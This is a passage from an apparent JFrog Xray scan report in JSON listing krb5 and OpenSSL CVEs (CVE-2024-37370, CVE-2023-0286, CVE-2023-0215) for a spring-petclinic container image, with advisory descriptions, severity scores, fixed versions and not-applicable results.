         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37370",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607812",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in Kerberos 5 may lead to an authentication bypass when parsing crafted GSS wrap tokens.",
            "FullDescription": "The `krb5` library is an implementation of the `Kerberos` Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS tokens` are part of the Generic Security Services Application Program Interface (GSS-API) used to provide secure communication between applications. A `GSS wrap token` is essentially a chunk of data that encapsulates encrypted data required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), attackers can craft the plaintext `Extra Count` field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.\nIn a truncation attack, the attacker somehow craft the message to indicate the message has finished in a way that will prevent the recipient picking up the rest of the message. This kind of attacks may lead to authentication bypass but rely heavily on the attacker ability to MiTM.\n\nThe general structure of a wrap token contains a header which includes the `Extra Count` field and an encrypted part which includes the message.\nA wrap token with a different value of `Extra Count` field between the plaintext and encrypted copies will be erroneously accepted, which allows a message truncation attack.\n\nThe wrap token header structure is similar to:\n```\nTOK_ID      : 2 byte\nFlags       : 1 byte\nFiller      : 1 byte\nExtra Count : 2 byte\nRRC         : 2 byte\n// Data (Encrypted)\n```\n\nTo successfully exploit this vulnerability the attacker will have to override the RRC field and the encrypted data in a way which will cause the receiving application think it got all of the message. This may lead to several issues, from authentication bypass to DoS.",
            "Impact": 5,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server (performing a man-in-the-middle attack) and be able to modify the token.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to an authentication bypass.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37370",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37370",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607812",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37370",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607812",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in Kerberos 5 may lead to an authentication bypass when parsing crafted GSS wrap tokens.",
            "FullDescription": "The `krb5` library is an implementation of the `Kerberos` Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS tokens` are part of the Generic Security Services Application Program Interface (GSS-API) used to provide secure communication between applications. A `GSS wrap token` is essentially a chunk of data that encapsulates encrypted data required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), attackers can craft the plaintext `Extra Count` field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.\nIn a truncation attack, the attacker somehow craft the message to indicate the message has finished in a way that will prevent the recipient picking up the rest of the message. This kind of attacks may lead to authentication bypass but rely heavily on the attacker ability to MiTM.\n\nThe general structure of a wrap token contains a header which includes the `Extra Count` field and an encrypted part which includes the message.\nA wrap token with a different value of `Extra Count` field between the plaintext and encrypted copies will be erroneously accepted, which allows a message truncation attack.\n\nThe wrap token header structure is similar to:\n```\nTOK_ID      : 2 byte\nFlags       : 1 byte\nFiller      : 1 byte\nExtra Count : 2 byte\nRRC         : 2 byte\n// Data (Encrypted)\n```\n\nTo successfully exploit this vulnerability the attacker will have to override the RRC field and the encrypted data in a way which will cause the receiving application think it got all of the message. This may lead to several issues, from authentication bypass to DoS.",
            "Impact": 5,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server (performing a man-in-the-middle attack) and be able to modify the token.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to an authentication bypass.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37370",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37370",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607812",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37370",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607812",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in Kerberos 5 may lead to an authentication bypass when parsing crafted GSS wrap tokens.",
            "FullDescription": "The `krb5` library is an implementation of the `Kerberos` Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS tokens` are part of the Generic Security Services Application Program Interface (GSS-API) used to provide secure communication between applications. A `GSS wrap token` is essentially a chunk of data that encapsulates encrypted data required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), attackers can craft the plaintext `Extra Count` field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.\nIn a truncation attack, the attacker somehow craft the message to indicate the message has finished in a way that will prevent the recipient picking up the rest of the message. This kind of attacks may lead to authentication bypass but rely heavily on the attacker ability to MiTM.\n\nThe general structure of a wrap token contains a header which includes the `Extra Count` field and an encrypted part which includes the message.\nA wrap token with a different value of `Extra Count` field between the plaintext and encrypted copies will be erroneously accepted, which allows a message truncation attack.\n\nThe wrap token header structure is similar to:\n```\nTOK_ID      : 2 byte\nFlags       : 1 byte\nFiller      : 1 byte\nExtra Count : 2 byte\nRRC         : 2 byte\n// Data (Encrypted)\n```\n\nTo successfully exploit this vulnerability the attacker will have to override the RRC field and the encrypted data in a way which will cause the receiving application think it got all of the message. This may lead to several issues, from authentication bypass to DoS.",
            "Impact": 5,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server (performing a man-in-the-middle attack) and be able to modify the token.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to an authentication bypass.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37370",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37370",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416710",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0286",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "There is a type confusion vulnerability relating to X.400 address processing inside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but the public structure definition for GENERAL_NAME incorrectly specified the type of the x400Address field as ASN1_TYPE. This field is subsequently interpreted by the OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an ASN1_STRING.  When CRL checking is enabled (i.e. the application sets the X509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass arbitrary pointers to a memcmp call, enabling them to read memory contents or enact a denial of service. In most cases, the attack requires the attacker to provide both the certificate chain and CRL, neither of which need to have a valid signature. If the attacker only controls one of these inputs, the other input must already contain an X.400 address as a CRL distribution point, which is uncommon. As such, this vulnerability is most likely to only affect applications which have implemented their own functionality for retrieving CRLs over a network.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-03-07T11:40:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416710",
            "VulnerabilityTitle": "",
            "ShortDescription": "A type confusion in OpenSSL may lead to denial of service when processing malicious X.509 certificates.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nIt was discovered that when an X.509 certificate contains a bad X.400 address and certificate revocation list (CRL) checking is enabled, a type confusion occurs, which may lead to a denial of service.\n\nThe issue results due to the `GENERAL_NAME_cmp()` function treating the `x400Address` field of the `GENERAL_NAME` structure incorrectly. Its true type is `ASN1_STRING` but it was treated as a `ASN1_TYPE` type.\n\nThe issue may allow an attacker to pass arbitrary pointers to the `memcmp` call, enabling them to read memory contents or create a denial of service.\n\nThe vulnerability requires the attacker to provide OpenSSL with both a crafted certificate chain and certificate revocation list (CRL), and CRL checking to be enabled.\n\nThe issue is highly unlikely to be exploited due to the following reasons:\n1. It will require a malicious actor to have control over a trusted control authority (CA), essentially compromising the CA.\n2. Most browsers today use their own specific compressed CRLs, which get pushed regularly to clients.\n\nMoreover, it is most likely to affect only programs that use a unique method of getting a certificate revocation list (CRL) over a network.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Requires the attacker to provide OpenSSL with both a crafted certificate chain and certificate revocation list (CRL), and CRL checking to be enabled.\nThis is highly unlikely because:\n\n1. It will require a malicious actor to have control over a trusted control authority (CA), essentially compromising the CA.\n2. Most browsers today use their own specific compressed CRLs, which get pushed regularly to clients.\nMoreover, it is most likely to affect only programs that use a unique method of getting a certificate revocation list (CRL) over a network.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog Security Tweet",
                  "Url": "https://twitter.com/JFrogSecurity/status/1623726234180911104",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0286",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0286",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416710",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0286",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "There is a type confusion vulnerability relating to X.400 address processing inside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but the public structure definition for GENERAL_NAME incorrectly specified the type of the x400Address field as ASN1_TYPE. This field is subsequently interpreted by the OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an ASN1_STRING.  When CRL checking is enabled (i.e. the application sets the X509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass arbitrary pointers to a memcmp call, enabling them to read memory contents or enact a denial of service. In most cases, the attack requires the attacker to provide both the certificate chain and CRL, neither of which need to have a valid signature. If the attacker only controls one of these inputs, the other input must already contain an X.400 address as a CRL distribution point, which is uncommon. As such, this vulnerability is most likely to only affect applications which have implemented their own functionality for retrieving CRLs over a network.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-03-07T11:40:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416710",
            "VulnerabilityTitle": "",
            "ShortDescription": "A type confusion in OpenSSL may lead to denial of service when processing malicious X.509 certificates.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nIt was discovered that when an X.509 certificate contains a bad X.400 address and certificate revocation list (CRL) checking is enabled, a type confusion occurs, which may lead to a denial of service.\n\nThe issue results due to the `GENERAL_NAME_cmp()` function treating the `x400Address` field of the `GENERAL_NAME` structure incorrectly. Its true type is `ASN1_STRING` but it was treated as a `ASN1_TYPE` type.\n\nThe issue may allow an attacker to pass arbitrary pointers to the `memcmp` call, enabling them to read memory contents or create a denial of service.\n\nThe vulnerability requires the attacker to provide OpenSSL with both a crafted certificate chain and certificate revocation list (CRL), and CRL checking to be enabled.\n\nThe issue is highly unlikely to be exploited due to the following reasons:\n1. It will require a malicious actor to have control over a trusted control authority (CA), essentially compromising the CA.\n2. Most browsers today use their own specific compressed CRLs, which get pushed regularly to clients.\n\nMoreover, it is most likely to affect only programs that use a unique method of getting a certificate revocation list (CRL) over a network.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Requires the attacker to provide OpenSSL with both a crafted certificate chain and certificate revocation list (CRL), and CRL checking to be enabled.\nThis is highly unlikely because:\n\n1. It will require a malicious actor to have control over a trusted control authority (CA), essentially compromising the CA.\n2. Most browsers today use their own specific compressed CRLs, which get pushed regularly to clients.\nMoreover, it is most likely to affect only programs that use a unique method of getting a certificate revocation list (CRL) over a network.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog Security Tweet",
                  "Url": "https://twitter.com/JFrogSecurity/status/1623726234180911104",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0286",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0286",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416706",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0215",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
